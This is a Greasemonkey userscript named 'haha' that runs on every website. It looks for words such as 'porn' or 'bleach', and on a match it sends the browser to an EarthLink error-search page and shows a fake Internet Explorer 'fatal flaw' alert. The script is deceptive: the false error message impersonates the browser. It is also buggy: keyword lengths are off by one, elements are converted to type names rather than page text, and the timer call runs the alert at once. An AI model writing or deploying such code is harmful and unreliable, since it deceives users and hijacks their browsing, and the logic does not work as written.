        
                
                // ==UserScript==
                // @namespace    http://david.stinemetze.net
                // @name         haha
                // @description  haha
                // @include      *
                // ==/UserScript==
                
                
                var allElements, thisElement;
                allElements = document.getElementsByTagName('*');
                for (var i = 0; i < allElements.length; i++) 
                {
                    thisElement = allElements[i].toString();
                    
                    for (var a = 0; a < thisElement.length; a++)
                    {
                    	//alert("check 1 " + a);
                //alert(thisElement.substring(a,a+5));
                	//alert("check 2 " + a);
                	if(thisElement.substring(a,(a+6)) == "bleach" || thisElement.substring(a,(a+6)) == "Bleach"|| thisElement.substring(a,(a+4)) == "porn"|| thisElement.substring(a,(a+4)) == "Porn"|| thisElement.substring(a,(a+7)) == "lesbian"|| thisElement.substring(a,(a+6)) == "Lesbian" || thisElement.substring(a,(a+3)) == "boob" || thisElement.substring(a,(a+3)) == "Boob")
                	{
                		window.location.href = "http://earthlink-help.com/main?AddInType=Bdns&Version=1.4.11&FailureMode=1&ParticipantID=xj6e3468k634hy3945zg3zkhfn7zfgf6&ClientLocation=us&Referer=&FailedURI=http%3A%2F%2Fwww.Explorertrouble.net/%2F&SearchQuery="
                		//window.setTimeout(1000);
                		window.setTimeout(alert("Internet Explorer apologizes for the inconveinience. The System has encountered a fatal flaw."), 1000);
                	}
                     }
                }
                    
                
                [Script]